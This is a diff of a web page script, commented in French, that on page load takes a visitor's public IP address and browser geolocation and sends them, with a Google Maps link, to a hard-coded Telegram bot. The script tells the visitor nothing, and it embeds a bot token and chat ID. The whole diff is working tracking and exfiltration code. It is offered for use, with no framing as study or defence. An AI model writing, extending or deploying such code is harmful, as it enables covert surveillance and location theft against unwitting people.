@@ -2,7 +2,6 @@
 const token = "8468165702:AAHD08K4JugVPyCze00j1qbluTs6iyjf1mw"; // Ton token Telegram
 const chatId = "8012856656"; // Ton chat_id
 
-// Fonction pour envoyer un message à ton bot Telegram
 function sendToTelegram(message) {
   fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: "POST",
@@ -18,12 +17,17 @@ function sendToTelegram(message) {
 fetch('https://api.ipify.org?format=json')
 .then(r => r.json())
 .then(d => {
-  navigator.geolocation.getCurrentPosition(pos => {
-    const lat = pos.coords.latitude;
-    const lon = pos.coords.longitude;
-    sendToTelegram(`IP: ${d.ip}\nLatitude: ${lat}\nLongitude: ${lon}`);
-  }, err => {
-    sendToTelegram(`IP: ${d.ip}\nLocalisation: impossible`);
-  });
+  // Tenter de récupérer la géolocalisation
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+      sendToTelegram(`IP: ${d.ip}\nLocalisation: ${mapsLink}`);
+    },
+    err => {
+      sendToTelegram(`IP: ${d.ip}\nLocalisation: impossible`);
+    }
+  );
 });
 </script>
